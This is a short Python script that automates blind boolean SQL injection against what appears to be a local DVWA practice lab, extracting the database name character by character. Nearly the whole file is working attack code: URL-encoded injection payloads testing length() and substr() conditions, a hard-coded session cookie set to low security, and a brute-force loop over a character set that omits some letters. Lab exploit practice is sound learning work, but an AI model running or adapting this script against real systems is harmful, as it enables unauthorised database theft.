#!/usr/bin/env python3

import requests
import math

get_length_query ='http://127.0.0.1/vulnerabilities/sqli_blind/?id=1%27%20and%20(SELECT%20length({})%20=%20{}%20)%20and%20%271%27=%271&Submit=Submit#'

get_content_query="http://127.0.0.1/vulnerabilities/sqli_blind/?id=1%27%20and%20(SELECT%20substr((SELECT%20{}),{},{})%20=%20%27{}%27)%20and%20%271%27=%271&Submit=Submit"


headers = {
        "Cookie": "PHPSESSID=q3s8iq0lm5cdvp6m2t2b0pusu1; security=low"
        }

sanity_check = "User ID exists in the database."
dictionary = "abcdefghklmnopqrstuvzwxyABCDEFGHKLMNOPQRSTUVWXYZ1234567890!@#$^&*()"
def next_number(high, low):
    return math.floor((high+low)/2)



def sanity_checker(url):
    req = requests.get(url,headers=headers)
    print(req.text)
    if sanity_check in req.text:
        return True
    return False


def get_content(query,length):
    name = ''
    for i in range(1, length+1):
        for j in dictionary:
            temp = get_content_query.format(query,i,1,j)
            #print(temp)
            if sanity_checker(temp):
                name+=j
                break;
    return name
def get_length(query):
    for i in range(0,255):
        temp = get_length_query.format(query,i)
        req = requests.get(temp,headers=headers);
        #print("Step")
        #print(req.text)
        if sanity_check in req.text:
            return i
        else:
            continue

database = "database()"
query_get_tables = ""

database_name = get_content(database,get_length(database))
print(database_name)
